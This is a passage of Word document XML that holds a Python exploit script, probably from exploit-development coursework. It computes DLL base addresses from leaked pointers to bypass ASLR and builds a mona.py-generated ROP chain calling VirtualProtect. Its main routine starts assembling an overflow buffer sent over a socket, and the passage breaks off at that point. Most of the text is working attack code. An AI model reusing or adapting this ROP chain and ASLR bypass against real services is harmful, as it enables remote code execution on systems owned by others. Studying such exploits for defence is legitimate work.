                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('CALCULATED BASES FROM LEAKED ADRESSES')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D0D87B2" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>print('-------------------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B1B9986" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="00B47CB9" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('KERNEL32: ', baseKernel32_2)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CDD65B3" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">        </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>print('WS2_32: ', baseWS2_32)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24934A76" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('UcrtBase: ', baseUcrtBase)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="419C60D1" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        print('-------------------------------------')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="273B0480" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        return baseUcrtBase, baseWS2_32, baseKernel32_2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E285C6C" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0D6E5E60" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def create_rop_chain(base_kernel32_dll, base_ucrtbase_DLL, base_WS2_32_dll):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E2732C2" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # rop chain generated with mona.py - www.corelan.be</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20D32AEC" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    rop_gadgets = [</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60226F88" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:gadgets_to_set_esi:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="241D9F68" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_kernel32_dll + 0x000a7a4e,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F791AF2" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_kernel32_dll + 0x00001934,  # ptr to &amp;VirtualProtect() [IAT kernel32.dll] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="040B784E" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x0003fbe2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4712F944" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x00028766,  # XCHG EAX,ESI # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DF170A2" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:gadgets_to_set_ebp:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="727AC2E7" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x00053639,  # POP EBP # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A93FFC4" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x0002e3a5,  # &amp; push esp # ret  [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AC7F91D" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:gadgets_to_set_ebx:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74ACB17D" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x00022024,  # POP EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2021EE17" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        0xfffffdff,  # Value to negate, will become 0x00000201</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50B7AE90" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x000a0348,  # NEG EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31B0ABB8" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x0000d236,  # XCHG EAX,EBX # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61B890C7" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:gadgets_to_set_edx:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00970175" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x0000ec33,  # POP EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C1F8CD8" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        0xffffffc0,  # Value to negate, will become 0x00000040</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="216AFBCF" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x00076b3d,  # NEG EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="204B0220" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_kernel32_dll + 0x0009f97b,  # XCHG EAX,EDX # RETN 0x00 [kernel32.dll] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="789D5BDD" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:gadgets_to_set_ecx:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47DA301C" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x000334e8,  # POP ECX # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="187481B5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_WS2_32_dll + 0x00027328,  # &amp;Writable location [WS2_32.dll] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48A0C6EF" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:gadgets_to_set_edi:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AFC91EB" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x0003ddc1,  # POP EDI # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2676CF12" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x000a034a,  # RETN (ROP NOP) [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36F2B231" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:gadgets_to_set_eax:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17AAD4AD" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x0009d7a5,  # POP EAX # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FADA048" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        0x90909090,  # nop</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12EA9CD0" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        # [---INFO:pushad:---]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D8E82F2" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        base_ucrtbase_DLL + 0x000c1224,  # PUSHAD # RETN [ucrtbase.DLL] ** REBASED ** ASLR</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F425E45" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    ]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60276D88" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    return b''.join(struct.pack('&lt;I', _) for _ in rop_gadgets)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63A1ECF8" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="560CDBE1" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="465C3542" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def main():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A73FBBE" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E8D8EE7" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="07AFF675" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    base_ucrtbase_DLL1, base_WS2_32_dll1, base_kernel32_dll1 = getAslrBase()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="048EA55F" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6F6AF032" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    base_kernel32_dll = int(base_kernel32_dll1, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="748DA153" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    base_ucrtbase_DLL = int(base_ucrtbase_DLL1, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7872F465" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    base_WS2_32_dll = int(base_WS2_32_dll1, 16)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D16C1A5" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1D0FD9FE" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    rop_chain = create_rop_chain(base_kernel32_dll, base_ucrtbase_DLL, base_WS2_32_dll)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="042AB347" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="752C61A3" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    a = b'\x41' * 36</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42AAA8EB" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    b = b'\x42' * 4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="281F1F35" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    c = rop_chain</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CFCF3F1" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1F274D87" w14:textId="77777777" w:rsidR="00160263" w:rsidRPr="004D58C1" w:rsidRDefault="00160263" w:rsidP="00160263">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
